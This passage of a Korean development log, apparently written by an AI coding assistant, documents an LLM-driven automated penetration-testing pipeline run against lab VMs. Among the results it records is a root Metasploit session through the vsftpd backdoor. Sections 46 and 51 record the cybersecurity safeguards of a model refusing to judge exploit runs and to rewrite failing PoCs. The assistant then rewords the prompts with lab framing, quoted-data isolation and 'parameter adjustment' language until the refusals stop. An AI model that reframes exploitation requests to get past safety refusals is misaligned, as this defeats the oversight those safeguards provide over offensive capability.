재시도)은 "포트가 조금이라도 열려 있으면" 정상 스캔으로 보기 때문에 이
케이스(적지만 0은 아닌 개수)를 못 잡는다 - 완전히 다른 실패 모드라 기존
방어 로직의 사각지대였다.

**수정**: `run_pipeline.py`가 VM을 직접 기동시킨 경우에 한해(이미 켜져 있던
경우는 안전하다고 보고 스킵), ping 확인 후 `VM_BOOT_SERVICE_GRACE_SEC=60`초의
여유 시간을 추가로 둔 뒤 스캔을 시작하도록 수정. 정확한 "충분한" 시간은
대상 이미지마다 다를 수 있어 경험적인 값이라 향후 다른 타겟에서 재조정이
필요할 수 있음을 인지하고 있음.

**교훈**: run_pipeline.py는 이제서야 실전에서 2번 돌았는데 2번 다 서로 다른
새로운 버그(1번은 원인이 검증자 실수였지만, 2번은 순수 코드 버그)를 드러냈다
- "환경 확인"이라는 이름의 단계가 실제로는 "ping만 확인"이었지 진짜 "환경이
쓸 준비가 됐는지" 확인이 아니었던 셈.

**세 번째 실행 결과 - 수정 효과 확인 + 새 회귀 버그 발견**: 60초 유예 시간
추가 후 재실행하니 포트 30개 정상 발견(플랫폼도 linux로 정확히 판정 - 44절
platform 수정도 같이 확인됨), Vulnerability Analysis도 vsftpd/telnetd/
UnrealIRCd에서 진짜 searchsploit 매칭이 나왔다(43절의 "검증자 병행 작업이
문제였다"는 진단이 맞았음이 재확인됨). Exploitation도 이번엔 처음으로 후보
20개가 실제로 시도됐다(이전 두 번은 0개) - 그런데 **vsftpd 2.3.4 백도어를
포함해 12개 시도 전부 실패**로 나왔다. 원인을 findings.jsonl에서 직접
확인하니 output이 전부 `stdbuf: failed to run command 'cd': No such file or
directory` 한 줄뿐이었다.

**원인**: 바로 이 43절에서 넣은 `stdbuf -oL -eL {command}` 수정 자체가
회귀 버그였다. `stdbuf`는 자기 뒤에 오는 첫 토큰을 실행 파일로만 취급하는데,
`exploitation.py`의 `run_poc()`가 만드는 명령이 `cd {WORKDIR} && {interpreter}
{filename} {target}`처럼 셸 내장 명령(`cd`)과 `&&`로 시작한다 - `stdbuf -oL
-eL cd ...`는 "cd"라는 실행파일을 PATH에서 찾다가 즉시 실패한다(`cd`는 내장
명령이라 실행파일 자체가 없음). 그 결과 PoC 스크립트가 타겟에 도달하기도
전에 로컬에서 매번 조용히 죽고 있었다 - 이게 vsftpd 백도어(원래 거의
100% 성공하는 유명한 취약점)까지 전부 실패로 만든 진짜 원인이었다.

**수정**: `stdbuf`로 개별 명령을 직접 감싸지 않고, `/bin/bash -c
{shlex.quote(command)}`를 감싸도록 변경 - `command`는 bash가 정상적으로
해석해서 `cd`/`&&`/파이프가 전부 원래대로 동작하고, stdbuf가 설정하는
`LD_PRELOAD` 환경변수는 bash의 자식 프로세스(nmap 등)에도 상속되므로 원래
목표(라인 버퍼링)도 유지된다. `cd /tmp && echo ... && pwd` 패턴으로 직접
재현/수정 확인함(정상 실행됨).

**남은 불확실성**: nmap 자체의 라인 버퍼링 효과는 이번 수정 이후로 재검증을
시도했으나(Kali 자신을 대상으로 한 부분 스캔), 짧은 관찰 창 안에서는 아직
"About X% done" 라인이 눈으로 확인되지 않았다 - 확정적 재검증은 다음 전체
스캔에서 이어서 볼 것. 이건 진행률 표시 UX 문제일 뿐이라 후순위로 미루고,
훨씬 심각했던 "cd 회귀"부터 고치는 게 맞다고 판단함.

**교훈 2**: 같은 세션 안에서 만든 수정(stdbuf)이 바로 다음 실전 검증에서
새 버그를 냈다 - 부분적인 수동 테스트(더미 job, `touch`)로는 이 클래스의
문제(첫 토큰이 셸 내장 명령인 실제 명령)를 못 잡았다. 실제 파이프라인
전체를 다시 돌려보는 것만이 이런 걸 잡아낸다는 걸 재확인 - 사용자가
처음에 "CLI에서도 동일하게 동작하는지 확인하고 싶다"고 한 요청이 결과적으로
이 회귀까지 잡아낸 셈.

**45-2. "cd" 회귀 수정 실측 검증**: `run_pipeline.py` 전체를 다시 돌리는 대신,
같은 vuln_analysis 결과를 재사용해서 vsftpd 2.3.4 백도어 Metasploit 시도만
단독으로 재현했다(`attempt_candidate()` 직접 호출). 결과: **root 권한
meterpreter 세션 획득 성공** (`Backdoor has been spawned!` / `Meterpreter
session 1 opened` / `root @ metasploitable.localdomain`) - 이 프로젝트
내내 기준 취약점으로 써온 CVE-2011-2523이 실제 자동화 코드 경로로 성공하는
걸 처음으로 확인했다. 다만 이 검증은 `exploit_target()`을 통째로 안 거쳤기
때문에(테스트 목적으로 `attempt_candidate()`만 직접 호출) findings.jsonl/
report.md엔 이 성공이 반영 안 됨 - 완전한 보고서가 필요하면 전체 파이프라인
재실행이 필요함을 인지.

## 46. exploitation.py의 LLM 판정 거부(refusal) 처리 - 감지/구분 + 결정론적 폴백

45절 재실행 로그를 사용자가 직접 findings.jsonl 기준으로 분석 요청했고, 그
과정에서 시도 12개 중 정확히 어떤 이유로 실패했는지 분류하다가 세 번째
카테고리를 발견했다: **LLM 판정 자체가 거부됨**(UnrealIRCd Remote Downloader/
Execute 시도) - `judge_attempt()`가 실제 msfconsole 실행 로그를 판정시켰는데
**구독 경로도, 그 폴백인 API 경로도 둘 다** Sonnet 5의 사이버보안 안전장치에
걸려 거부당했다. `vuln_analysis.py`는 이미 이런 상황(26절 근처, "Backdoor"
제목 refusal)에 대한 폴백(`_fallback_verdict`)이 있는데, `exploitation.py`의
`judge_attempt()`엔 없어서 거부되면 그냥 "실패"로 기록돼버렸다 - 진짜 성공
여부를 알 방법이 없어짐.

**사용자 요청 2가지**: (1) 안전 정책 거부를 다른 실패(토큰 미설정, 사용량
한도, 네트워크 오류 등)와 콘솔에서 구분해서 보여줄 것, (2) 이 문제 자체를
어떻게 해결할지 고민할 것.

**구현 1 - 거부 감지/구분** (`core/llm_client.py`): 새 예외 타입
`RefusalError(RuntimeError)` 추가. `_call_via_subscription()`은 원래
`proc.returncode != 0`이면 바로 뭉뚱그린 `RuntimeError`를 던졌는데, 실측해보니
refusal도 이 경로로 옴(exit code 1인데 stdout에 `"stop_reason":"refusal"`이
담긴 JSON이 있었음) - returncode가 0이 아니어도 JSON 파싱을 먼저 시도해서
`stop_reason=="refusal"` 신호가 있으면 `RefusalError`로 구분해서 던지도록
수정. `_call_via_api()`도 텍스트 블록이 없을 때 `response.stop_reason`이
`"refusal"`이면 마찬가지로 `RefusalError`. `call()`은 `RefusalError`를
`except RuntimeError`보다 먼저(더 구체적인 타입이 먼저 와야 함) 잡아서
`"[llm_client] 안전 정책 거부(refusal)"`라는 별도 메시지를 찍고, API 폴백
경로도 거부되면 그것도 별도 메시지 찍고 그대로 전파(재시도로 해결 안 되는
문제라 호출자가 다른 수단을 쓰게 함).

**구현 2 - 실제 해결책** (`modules/exploitation.py`):
1. `VERDICT_PROMPT` 재구성 - `vuln_analysis.py`의 검증된 패턴(승인된 랩
   프레이밍, "판정이지 새 실행이 아니다" 명시, 원본 출력을 인용 블록으로
   격리)을 그대로 적용해서 애초에 거부될 확률을 낮춤.
2. `_fallback_judge(output, reason)` 신설 - `vuln_analysis._fallback_verdict()`
   와 같은 이유. 출력 텍스트의 결정론적 패턴으로 대충 판정한다: 성공 신호
   (`"session N opened"` 계열) 있으면 성공(confidence 0.6, 사람 재확인 권장),
   로컬 실행 오류 신호(`stdbuf: failed to run command` 등 - 45-1절의 그
   회귀 버그 같은 상황)면 "실패 아님, 재시도 필요"로 별도 구분, 명시적 실패
   신호(`No session was created`/`Connection refused`)면 실패, 아무 신호도
   없으면 최저 확신도로 "사람이 직접 확인 필요"라고 명시.
3. `judge_attempt()`가 `call_json()`을 try/except로 감싸서 `RefusalError`는
   `judge_refused`, 그 외 예외는 `judge_failed` 이벤트로 findings.jsonl에
   남기고 `_fallback_judge()`로 대체 - 함수가 더 이상 예외를 던지지 않고
   항상 (성공여부, 확신도, 근거) 튜플을 반환하도록 바뀜(시그니처에
   `engagement_id` 추가, 호출부 1곳 수정).

**실측 검증**: `_fallback_judge()`를 성공/실패/로컬오류/신호없음 4가지
샘플로 직접 테스트해서 전부 올바르게 분류됨을 확인. `judge_attempt()`를
`call_json`을 `RefusalError`로 mock해서 통합 테스트 - 폴백 판정과
`judge_refused` finding 둘 다 정상적으로 남는 것 확인.

## 47. `_run_interactive()`도 45-1절 부팅 유예시간 사각지대였음 (사용자 발견)

사용자가 직접 CLI로 돌려보겠다고 해서 `python run_pipeline.py`(인터랙티브
모드) 사용법을 안내했는데, "다 꺼져 있는데 번호 선택하면 알아서 켜주냐"는
질문을 받고 확인해보니 **45-1절에서 고친 부팅 유예시간이 이 경로엔 안
걸리는** 사각지대가 있었다.

**원인**: `_run_interactive()`는 대상 IP를 모르는 상태로 시작하므로(MAC
주소로 IP를 찾아야 함, `_resolve_target_ip()`), IP를 알아내려면 **자기가
먼저 VM을 기동**시켜야 한다. 그런 다음 `run_pipeline(target, vm_name=...)`을
호출하는데, 이 시점엔 VM이 이미 "실행 중"이라 `run_pipeline()` 내부의
`freshly_started` 판정이 False가 돼서 60초 유예시간 로직 자체가 발동을 안
한다 - 스크립팅 경로(`python run_pipeline.py <ip> <vm>`)만 대상으로 고쳤지,
인터랙티브 경로는 VM을 부팅시키는 주체가 다르다는 걸 놓쳤다.

**수정**: `_run_interactive()`가 스스로 VM을 기동시킨 경우(`was_running`이
False였던 경우)에 한해, IP 확인 직후 같은 `VM_BOOT_SERVICE_GRACE_SEC=60`초
유예시간을 직접 적용하도록 추가 - `run_pipeline()`은 이미 켜진 VM을 받으므로
자체 유예시간은 건너뛰지만(중복 대기 방지), 사용자 입장에서 보는 최종 동작은
스크립팅 경로와 동일해짐.

## 47-1. 인터랙티브 모드 VM 선택 - 음수 인덱스 버그 (사용자 실전 발견)

사용자가 직접 `python run_pipeline.py`를 실행하다가 발견: "0"을 입력했더니
4번(Metasploitable2)이 실행됐다. 원인은 파이썬 리스트가 음수 인덱스를
허용한다는 점 - `int("0") - 1 == -1`이고 `vms[-1]`은 IndexError 없이 **마지막
항목**을 조용히 반환한다. 기존 코드는 `try: vms[int(choice)-1] except
(ValueError, IndexError)`로만 방어했는데, 이 경우는 애초에 예외가 안 나서
못 걸렀다. `1 <= idx <= len(vms)` 범위를 명시적으로 먼저 검사하도록 수정.

## 48. run_pipeline.py Ctrl+C 처리 - 홀드/완전종료/부분 보고서 (사용자 요청)

사용자가 인터랙티브 모드를 직접 써보다가 지적: "사용 중에 종료나 홀드하고
싶을 수 있잖아." 기존엔 Ctrl+C를 누르면 그냥 파이썬 트레이스백과 함께 죽어서,
대상 VM이 켜진 채로 방치되거나(리소스 낭비, DESIGN.md 20-2절이 경고하는
"오래 켜둘수록 크래시 위험") 게스트 쪽 job이 orphan으로 남을 수 있었다.

**구현** (`run_pipeline.py`):
- `run_pipeline()`의 8단계 본문을 `_run_pipeline_stages()`로 분리하고,
  `run_pipeline()`은 그걸 `try/except KeyboardInterrupt`로 감싸는 얇은
  래퍼가 됨. `_run_interactive()`의 VM 기동+부팅 유예시간 대기 구간도 별도로
  감싸서(파이프라인 진입 전, 즉 engagement_id가 아직 없는 시점의 중단도
  커버) 두 진입점 다 안전해짐.
- `_handle_interrupt(engagement_id, vm_name)` - 중단되면 findings.jsonl에
  `interrupted` 이벤트를 먼저 남기고(engagement_id가 있으면), 선택지를 준다:
  1. **홀드** (기본값) - `env.host_power.hold()`로 VM을 savestate. 재개
     방법(`resume()` 호출 후 `run_pipeline.py` 재실행)을 콘솔에 안내. "이어서
     진행"이 끊긴 스테이지 중간부터 재개하는 건 아니라는 점을 docstring에
     명시(스캔 도중 끊으면 스캔은 처음부터 다시 함 - 파이썬 프로세스 자체가
     끝났으므로 스테이지 단위 체크포인트가 없음).
  2. **완전 종료** - 대상 VM을 정상 종료(graceful)까지 마치고 나감.
  3. **그냥 나가기** - VM 상태 그대로 두고 나감(다음에 `health_check`로
     확인하라고 안내).
  - 이 프롬프트 자체에서 또 Ctrl+C가 눌리면(재중단) 그냥 선택지 3(정리 없이
    종료)으로 처리 - 무한정 다시 물어보지 않음.
- `_offer_partial_report(engagement_id)` - VM 처리 후, "지금까지 진행한
  내용으로 보고서를 만들까요?"라고 물어본다(사용자 요청). 기본값 Y. 만들면
  `save_report(engagement_id, vm_names=None)` - `vm_names=None`인 이유: VM
  처리(홀드/완전종료/그대로)는 위에서 이미 선택 완료했으므로, `save_report()`
  가 원래 하는 "정상 종료까지 마무리" 동작을 여기서 또 하면 안 됨(특히
  "홀드"를 선택했는데 `save_report()`가 그 VM을 또 shutdown 시도하면 홀드가
  무의미해짐).
- `sys.exit(130)`로 종료 - 유닉스 관례(128+SIGINT)라 셸에서 종료 이유를
  구분할 수 있음.

**보고서에 중단 사실 표시** (`modules/reporting.py`): `_summary()`가
`stage="run_pipeline", event="interrupted"` findings를 확인해서, 있으면
보고서 맨 위(Summary 섹션 시작 부분)에 "⚠ 이 인게이지먼트는 사용자에 의해
중단됨 - 아래 내용은 부분 결과" 경고를 인용 블록으로 붙인다 - 완료된 정식
보고서와 헷갈리지 않게.

**실측 검증**: `_handle_interrupt()`를 실제 engagement_id로 호출해서
(옵션 3 + 보고서 생성 Y) 전체 흐름 확인 - VM 처리 메시지, 보고서 생성 프롬프트,
실제 report.md 저장, 그 안에 경고 배너가 정확히 포함된 것까지 전부 확인함.

## 49. 인터랙티브 메뉴에 Docker 대상(Juice Shop) 추가

사용자 지적: "거기 보여주는 vm 들 말고도 juice shop 같은 건 kali docker에
있다며. 그거도 다 보여줘야 할거 같은데." `_run_interactive()`의 VM 목록은
`env.provision_target.list_target_vms()`(VirtualBox 등록 VM만)를 보므로
Juice Shop(Kali 안 Docker 컨테이너, 38절)은 애초에 안 잡혔다.

**설계 결정 - 일반 파이프라인에 태우지 않음**: 처음엔 그냥 Kali IP를
`run_pipeline()`에 target으로 넘겨서 8단계를 그대로 태울까 했는데, 이러면
(1) scanning.py가 Kali 자신의 다른 서비스(SSH, msfrpcd 등)까지 같이 잡아서
결과가 지저분해지고, (2) vuln_analysis.py(searchsploit)/exploitation.py
(Metasploit)는 Juice Shop의 실제 취약점(로그인 SQLi - CVE 번호 없는 앱 로직
결함, 18/38/39절)을 원천적으로 못 찾는다 - "돌렸는데 아무것도 없다"는
잘못된 결론을 낼 위험이 있었다. 그래서 이 대상은 이미 실전 검증된 별도
경로(`modules.web_exploit.probe_json_endpoint`)로 바로 보내는
`_run_docker_target()`을 신설했다 - VM 기동/MAC IP 탐색도 필요 없음(IP:포트
고정).

**구현**: `run_pipeline.py`에 `DOCKER_TARGETS` 레지스트리(Juice Shop의
IP/포트/로그인 엔드포인트/바디) 추가. `_run_interactive()`의 메뉴가 VM
목록 아래에 "Kali 안의 Docker 대상" 섹션을 별도로 보여주고, 번호가 VM
개수를 넘으면 `_run_docker_target()`으로 라우팅. 선택 로직은 47-1절에서
고친 범위 검사(`1 <= idx <= total_options`)를 VM+Docker 합친 전체 개수
기준으로 그대로 재사용.

**실측 검증**: `_run_docker_target()` 직접 호출로 end-to-end 확인 - 첫
시도는 일시적 guestcontrol 타임아웃으로 실패(오늘 여러 번 겪은 것과 같은
일과성 문제, Kali 재확인 후 즉시 재시도로 해결), 재시도에서 로그인 SQLi
1건 정상 확인 + 보고서 생성까지 성공. 사소한 진행률 표시 버그도 하나
발견해서 같이 고침(`progress.start_pipeline(1)`인데 실제로는 2단계(Web
Exploit + Reporting)를 진행해서 "2/1"로 찍힘 - `start_pipeline(2)`로 수정).

## 50. setup_doctor.py를 파이프라인 실패 시 자동 호출로 연결

사용자가 대화 중 정확한 지적을 했다: "지금까지 만든 건 LLM 호출을 하는
프로그램이지 에이전트가 사용된 것 같지는 않은데" - 맞다, `vuln_analysis.py`/
`exploitation.py`/`post_exploit.py`는 전부 순서가 코드에 고정된 "구조화된
판정 1회" 패턴이고 진짜 에이전틱 툴콜 루프는 `setup_doctor.py`(33절) 하나뿐
이었다. 그런데 이어서 "근데 메인 파이프라인에서 셋업닥터를 호출하고 있어?"
라고 물어서 실제로 grep해보니 **호출하는 곳이 없었다** - `setup_doctor.py`는
이 세션 내내 내가 문제 생길 때마다 수동으로(`python -m env.setup_doctor`)
불러 쓴 완전히 독립적인 도구였지, 파이프라인에 연결된 적이 없었다.

**요청**: "프로그램 사용중에 셋업닥터가 필요할 때 불려지도록 고쳐" - 자동
파이프라인이 환경 문제로 막히면 사람이 개입하기 전에 스스로 진단/복구를
시도하게 만드는 것.

**구현** (`run_pipeline.py`의 "환경 확인" 단계, 두 지점):
1. `ensure_kali_running(auto_restart=True)`가 실패하면(표준 재기동으로도
   Kali가 안 살아남) - `diagnose(engagement_id, KALI_VM, "guestcontrol이
   응답하지 않고 표준 재기동도 실패함")` 호출. 고쳐졌으면(`diagnosis["fixed"]`)
   `ensure_kali_running(auto_restart=False)`로 재확인 후 계속 진행, 안
   고쳐졌으면 진단의 `next_steps`를 담아 RuntimeError.
2. `check_target_reachability()`가 15회 재시도 후에도 실패하면 - 같은 식으로
   `diagnose(engagement_id, vm_name, "{target}에 ping이 안 됨 - VM 부팅/
   네트워크 문제로 추정")` 호출, 재확인 후 계속 진행하거나 실패 메시지에
   진단 결과를 담음.

**왜 "표준 재시도가 다 실패한 후"에만 부르는가**: `call_with_tools()`는
구독 경로를 못 쓰고 항상 종량제 API만 쓰는 데다(도구 스키마를 CLI headless로
못 넘겨서, 16절) 최대 10턴짜리 툴콜 루프라 매 호출 비용/시간이 결정론적
재시도보다 훨씬 크다 - 이미 검증된 결정론적 재시도(15회×10초 ping, Kali
표준 재기동)로 풀리는 문제까지 에이전트를 부르면 낭비다. 이 지점은 정확히
DESIGN.md 1절이 정의한 "전환 포인트"(고정된 재시도로 안 풀리고 원인이 매번
다른 문제 - 이 세션 내내 VM마다 완전히 다른 이유로 부팅/연결 문제를
겪었음, 33절)에 해당해서 여기서만 자동으로 에이전트를 태운다.

**검증 상태**: import 경로/순환참조 없음은 확인함(정상 로드). 실제 장애
상황을 인위로 재현하는 건 Kali를 일부러 망가뜨리거나 API 비용을 들여야
해서 이번엔 안 했음 - 다음에 실제로 환경 문제가 나면 그때 실전 검증될
예정.

## 51. exploit_doctor.py — 실패한 PoC를 자동으로 고쳐서 재시도하는 에이전트

사용자와 "메인 파이프라인엔 에이전트가 없다"는 대화(50절) 끝에, 진짜 에이전트가
필요한 두 번째 지점으로 지목된 곳: `vuln_analysis.py`가 이미 "이 PoC는 코드
수정이 필요해 보인다"고 판정만 하고 실제로 고치진 않던 부분(18절의 알려진
한계 - `run_poc()`는 대상 IP만 인자로 넘기는 관례만 시도). PoC가 왜 실패하는지
(하드코딩된 포트/오프셋/버전 문자열 등)는 매번 완전히 달라서 setup_doctor.py와
같은 "전환 포인트"(1절)에 해당한다.

**구현**:
- `exploitation.py`의 `VERDICT_PROMPT`/`judge_attempt()`에 `likely_fixable`
  필드 추가 - LLM이 실패 판정과 함께 "이 실패가 스크립트 파라미터 조정으로
  해결될 것 같은지"까지 같이 판정하게 함(반환 튜플이 3개→4개로 바뀜, 호출부
  1곳 수정). 휴리스틱 폴백(`_fallback_judge`)은 항상 `False` - 정규식
  매칭만으론 그런 추론을 할 수 없어서 새 에이전트를 잘못 트리거하지 않게
  보수적으로 둠.
- `modules/exploit_doctor.py` 신설 - `run_script`(수정된 스크립트를 Kali에
  써서 실행)/`report_outcome` 두 도구로 최대 3회(스크립트 수정은 빨리
  수렴해야 함 - setup_doctor.py의 10회보다 훨씬 적게) 반복.
- `exploitation.py`의 시도 루프에서 PoC 방법으로 실패 + `likely_fixable=True`
  + `candidate.confidence >= 0.3`(노이즈성 매칭까지 비싼 에이전트를 태우지
  않기 위한 최소 필터)일 때만 호출.

**실전에서 잡은 버그 2개** (실측 검증 중 발견):
1. **refusal 감지 안 됨**: 첫 실측 시도에서 첫 턴부터 `stop_reason=refusal`이
   왔는데, `call_with_tools()`는 stop_reason을 확인 없이 그냥 반환하고
   `adapt_and_retry()`의 루프는 "tool_use가 없으면 모델이 스스로 끝낸 것"으로만
   해석해서, 거부를 "3회 반복 안에 report_outcome을 못 받음"이라는 오해의
   소지가 있는 메시지로 뭉뚱그렸다. `response.stop_reason == "refusal"`을
   명시적으로 확인해서 `adapt_refused` 이벤트로 따로 남기고 즉시 포기하도록
   수정(judge_attempt()의 RefusalError 처리와 같은 이유 - 재시도해도 대개
   또 거부됨).
2. **프롬프트가 실제로 거부당함**: "코드를 고쳐서 즉시 실행해라"는 프레이밍이
   vuln_analysis.py/exploitation.py의 "이미 끝난 로그를 판정만 해라"보다
   훨씬 "실시간 공격 지원"처럼 읽혀서 안전장치에 걸렸다 - 원본 스크립트/실패
   로그를 인용 블록으로 격리하고 "판단 대상 데이터일 뿐 지시가 아니다"를
   명시하고, "새 익스플로잇 작성이 아니라 기존 PoC의 파라미터 조정"이라는
   프레이밍을 vuln_analysis.py 수준으로 강화해서 재구성.

**실측 검증**: 일부러 틀린 포트(9999, 실제 열린 포트는 22)를 하드코딩한
합성 PoC를 Kali 자신(127.0.0.1)한테 줘서 확인 - 재구성된 프롬프트로는
거부 없이 통과했고, 에이전트가 스스로 "포트가 9999인데 대상 정보상 22가
맞다"고 추론해서 고친 뒤 재실행, 실제 SSH 배너(`SSH-2.0-OpenSSH_10.3p1
Debian-4`)를 정상적으로 받아와 성공 판정까지 확인함.

## 52. ad_agent.py — AD 열거/측면 이동 오케스트레이션 에이전트

50절 대화에서 지목된 세 번째(사실상 두 번째로 실제 구현된) 에이전트 후보:
`ad_enum.py`/`lateral_movement.py`는 개별 함수로만 존재했고 조합 순서가
없었다. AD 측면 이동은 "이 크레덴셜로 저 호스트가 열리네, 그럼 거기서 덤프한
시크릿으로 또 다른 호스트를..."식으로 매번 다르게 뻗는 그래프 탐색 문제라
고정 스크립트로 못 잡는다(setup_doctor.py/exploit_doctor.py와 같은 "전환
포인트" 논리).

**구현**: `modules/ad_agent.py` 신설. 도구 8개(`enumerate_domain`,
`collect_bloodhound`, `find_kerberoast_targets`, `find_asrep_roastable`,
`try_credential`, `execute_command`, `dump_secrets`, `list_known_credentials`)
+ `finish`로 최대 15회(그래프 탐색이라 exploit_doctor.py의 3회보다 훨씬
넉넉하게) 반복. `lateral_movement.py`가 이미 문서화한 계정 잠금 방지 정책
(같은 크레덴셜 반복 시도 금지, 대상 순차 처리)을 시스템 프롬프트에도 명시.
`exploit_doctor.py`에서 막 잡은 refusal 미감지 버그를 처음부터 반영해서
`response.stop_reason == "refusal"`을 명시적으로 확인하도록 설계.

**검증 상태**: 코드 리뷰 수준. 현재 AD 랩에 도메인 컨트롤러(AD-DC01)
하나뿐이라(멤버 워크스테이션 없음) 측면 "이동"의 실제 이동 구간(다른
호스트로 건너가기)은 검증할 대상 자체가 없다 - enumerate/kerberoast/
자격증명 검증까지는 실제로 확인 가능하지만, dump_secrets 이후 새 크레덴셜로
다른 호스트를 여는 흐름은 멤버 호스트가 추가되기 전까지 미검증으로 남음.

## 53. 진행시간 표시를 h/m/s로 (사용자 요청) + searchsploit JSON 파싱 실패 로깅 추가

**시간 표시**: "경과시간은 h m s로 표시하자 읽기힘들어" - `core/progress.py`에
`format_elapsed(seconds)` 추가(`"2140s"` -> `"35m 40s"`), `stage()`/`done()`
및 `env/job_runner.py`의 하트비트 메시지 4곳 전부 이 함수로 통일.

**searchsploit 실패 로깅 사각지대 추가 발견**: 사용자가 직접 돌린 파이프라인
결과에서 "취약점 후보가 저번엔 20개였는데 이번엔 11개"라고 지적, findings로
추적한 결과 포트 513("login" 서비스, 흔한 단어라 매칭이 많이 나옴)의
searchsploit 매칭이 15건(하필 MAX_SEARCHSPLOIT_MATCHES 상한과 일치)에서
0건으로 널뛴 게 원인이었다. 43절에서 이미 "호출 자체 실패"는 이벤트로 남기게
고쳤지만, **JSON 파싱 실패**(`except json.JSONDecodeError: return []`)는 여전히
조용히 삼켜지고 있었다 - 응답이 클수록(흔한 단어 검색일수록) guestcontrol
전송 도중 잘릴 위험이 커서 이 경로가 특히 취약했다. 이것도
`searchsploit_lookup_failed` 이벤트로 남기도록 수정.

## 54. web_exploit.py를 run_pipeline.py 자동 흐름에 연결 + 보고서 경로 출력 순서 버그

**web_exploit.py 미연결**: 사용자가 "여전히 익스플로잇 코드를 작성하지
못해서 플래그까지 가져온 적이 없다"고 지적, 두 가지로 나눠 확인했다:
(A) Claude에 직접 "새 익스플로잇 코드를 작성해달라"고 요청하면 안전 정책상
안정적으로 거부됨 - 이건 프롬프트로 우회 불가능한 하드 바운더리라고 명확히
안내함. (B) 파이프라인을 그냥 돌렸을 때 아무것도 못 찾는 문제 - 확인해보니
`web_exploit.py`(sqlmap `--forms` 기반 폼 SQLi 탐지)가 `run_pipeline.py`의
8단계 자동 흐름에 처음부터 연결된 적이 없었다(Juice Shop만 `_run_docker_target()`
으로 예외적으로 직행시켰을 뿐). Kioptrix2의 실제 알려진 1차 공격 경로(로그인
폼 SQLi)가 정확히 이 종류(CVE 없는 앱 로직 결함)라 vuln_analysis.py/
exploitation.py로는 원천적으로 못 찾는데, LLM이 뭘 거부해서가 아니라 애초에
맞는 도구를 안 써봤을 뿐이었다.

**수정**: Exploitation 단계에서 `exploit_target()` 다음에, 스캔에서 찾은
http(s) 계열 포트마다 `web_exploit.probe_web_app()`(sqlmap `--forms`)을
자동으로 시도하도록 추가 - 결정론적 도구라 LLM이 코드를 작성/거부할 여지
자체가 없음.

**남은 한계(사용자에게 명시적으로 알림)**: Kioptrix2의 실제 플래그 획득
체인은 로그인 SQLi(1단계) 다음에 **인증된 관리자 패널의 커맨드 인젝션**
(2단계)까지 필요하다 - sqlmap은 1단계만 잡고, 2단계(인증 후 접근하는
별도 기능의 커맨드 인젝션)는 아직 아무 도구도 자동으로 안 찾는다. 이번
수정은 1단계까지만 자동화했고, 2단계는 향후 결정론적 탐지 방식(예:
시간지연 기반 blind 커맨드 인젝션 테스트)을 추가로 만들어야 완결됨 -
과장 없이 있는 그대로 사용자에게 전달함.

**보고서 경로 출력 순서 버그**: 별개로 사용자가 지적: "로컬에서 돌리고 나면
VM 종료 표시 후에 리포트 경로를 몰라서 접근을 못 하네." `save_report()`가
report.md를 쓴 뒤 **VM 정상종료(최대 30초)까지 끝나야** 호출자
(`run_pipeline.py`)가 그제서야 경로를 출력하고 있었다 - 그 사이엔
`[graceful shutdown]...`/`[force poweroff]...` 메시지만 보이고 경로는 안
보임. `save_report()` 내부에서 report.md를 쓰자마자(VM 종료 시도 전에) 바로
`progress.info()`로 경로를 출력하도록 수정 - 이제 종료 대기가 얼마나
걸리든 경로부터 먼저 보임.

## 55. Kioptrix1 실전 검증 — searchsploit 쿼리 버그 2개 + 세션 락 경쟁 + 서비스 태그 사각지대

사용자가 Kioptrix1을 돌렸는데(`20260812-053714-kioptrix1`) 여전히 플래그를
못 가져왔다고 지적, findings.jsonl을 단계별로 추적해서 원인 4개를 전부
찾아냈다 - Kioptrix1의 실제 알려진 취약점(Samba trans2open 버퍼오버플로우
CVE-2003-0201, Apache mod_ssl OpenFuck 버퍼오버플로우 CVE-2002-0082)이 둘 다
vuln_analysis.py에서 후보로도 안 잡히고 있었다.

**버그 1 - searchsploit 쿼리의 괄호 자르기가 너무 공격적**
(`vuln_analysis.py`): 예전엔 "첫 번째 괄호에서 잘라내기"였는데, 배너
`"Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b"`에서
실제 취약한 컴포넌트(`mod_ssl/2.8.4`)가 괄호 뒤에 있어서 통째로 날아갔다
(쿼리가 "Apache/1.3.20"만 남아 0건). **모든 괄호 그룹을 제거**(중첩 포함,
안정될 때까지 반복 적용)하고 괄호 밖 텍스트는 보존하도록 `_searchsploit_query()`
헬퍼로 분리해서 재작성 - 원래 버그 케이스("Apache httpd 2.0.52 ((CentOS))")도
여전히 올바르게 처리됨을 확인.

**버그 2 - 슬래시(/)가 붙은 토큰을 searchsploit이 한 단어로 취급**
(`vuln_analysis.py`, 버그 1과 같은 함수): `"mod_ssl/2.8.4"`가 실제 제목의
"mod_ssl"과 "2.8.7"(따로 있는 단어)에 안 걸림(실측: 슬래시 있는 채로는
0건, 공백으로 바꾸면 실제 OpenFuck 익스플로잇이 바로 나옴) - `/`를 공백으로
치환하도록 같은 헬퍼에 추가.

**버그 3 - 서브모듈 "병렬" 실행이 세션 락 경쟁을 유발**(`scanning.py`):
`http_enum`/`smb_enum`/`ftp_anon_check`를 `ThreadPoolExecutor(max_workers=8)`
로 돌렸는데, 셋 다 `run_in_kali()`를 거치고 이건 크로스프로세스 세션 락으로
전역 직렬화된다 - 진짜 병렬이 아니라 락을 다투는 구조였을 뿐. gobuster(최대
180초 보유 가능)가 락을 쥐고 있는 동안 enum4linux는 락 대기 90초 만에
타임아웃돼서 통째로 실패했다(실측: smb_enum 결과가 `"Kali 세션 락을 90s
넘게 못 얻음"` 에러만 남음 - Samba 버전 정보 자체를 못 얻어서 trans2open을
후보로 뽑을 재료가 애초에 없었음). `ThreadPoolExecutor`를 걷어내고 순차
실행으로 변경 - 애초에 진짜 병렬이 아니었으므로 총 소요시간에 실질적 손해는
없음.

**버그 4 - "ssl/https" 서비스 태그 미포함**(`scanning.py`/`run_pipeline.py`
공통): http(s) 계열 포트 판정 튜플이 `("http", "https", "ssl/http")`였는데,
Kioptrix1의 443번 포트는 nmap이 `"ssl/https"`로 태그했다(`"ssl/http"`가
아니라 순서가 반대) - 튜플에 없어서 `http_enum`/`web_exploit.py` 둘 다
포트 443을 건너뛰고 있었다. 두 파일 모두 `"ssl/https"`를 추가해서 방어적으로
넓힘.

**실측 검증**: 기존 Kioptrix1 engagement의 스캔 데이터를 재사용해서(재스캔
없이) `gather_candidates()`를 다시 호출 - 포트 443이 이제 정확히 OpenFuck
익스플로잇 4건을 찾아냄을 확인. 포트 139(Samba)는 여전히 0건인데, 이건
